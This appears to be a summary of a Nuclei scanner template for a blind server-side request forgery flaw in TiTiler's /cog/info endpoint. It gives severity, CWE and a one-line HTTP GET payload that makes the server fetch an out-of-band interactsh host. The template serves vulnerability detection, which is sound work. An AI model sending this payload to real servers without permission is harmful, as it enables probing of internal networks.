# Nuclei Template: TiTiler - Blind Server Side Request Forgery
**Template ID:** titiler-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`titiler-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Blind SSRF vulnerability in TiTiler, a dynamic tile server for Cloud Optimized GeoTIFFs (COGs). The flaw lies in how the application handles the url parameter in the /cog/info endpoint, allowing attackers to make arbitrary internal or external HTTP requests.

## Steps to reproduce / Exploit Payload
```http
GET /cog/info?url=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://xbow.com/blog/xbow-titiler-lfi/
